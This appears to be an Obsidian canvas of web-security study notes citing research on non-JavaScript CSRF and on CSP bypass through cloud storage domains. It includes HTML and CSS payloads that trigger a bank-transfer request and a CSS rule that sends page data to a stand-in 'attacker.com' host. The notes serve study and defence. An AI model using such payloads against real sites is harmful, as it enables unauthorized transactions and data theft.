{
	"nodes":[
		{"id":"22b8ea6daf0559d5","type":"text","text":"If a server does not check the HTTP method used, CSRF can be technically executed with a GET request that is implicitly executed with:\n\n  `<img>` or `<a>` tags \n\n```html\n<img src=\"https://banca.com/transfer?amount=5000&to_account=123456\">\n```\n\nCSS rules and custom attributes\n\n```CSS\n/* it will execute a GET request with parameters */\ndiv[secret-data] {\n    background-image: url(\"https://attacker.com/log?data=\"attr(secret-data));\n}\n\n```\n\nUsing the CSS `@import` statement\n```css\n\n@import url(\"https://banca.com/transfer?amount=5000&to_account=123456\");\n\n```\n","x":640,"y":400,"width":880,"height":680},
		{"id":"726008afe859bd11","type":"text","text":"### Non-JS based CSRF [[(Maes, Heyman, et al., 2009)]], [[(Felsch, Heiderich, et al., 2015)]]","x":640,"y":240,"width":880,"height":120},
		{"id":"472594e7924f8fc8","type":"text","text":"### XSS driven by cloud object storage [[(Lv, Shi, et al., 2023)]]","x":640,"y":-680,"width":820,"height":80},
		{"id":"370cd5d8f930cf77","type":"text","text":"[[CSP (Content Security Policy)]] may be bypassed if the whitelisted cross-domain is too general. This is often the case with Cloud [[object storage service]]: for example, Google Cloud, and Amazon AWS\n- developers often indicate a general domain `storage.googleapis.com`, in the HTTP header, ==trusting Google sources==\n- an attacker can upload a malicious script in Google Cloud, which share the `storage.googleapis.com` root domain\n- in case of XSS attack the CSP will not block the execution of the malicious script because the domain is considered legitimate\n","x":640,"y":-560,"width":820,"height":400}
	],
	"edges":[]
}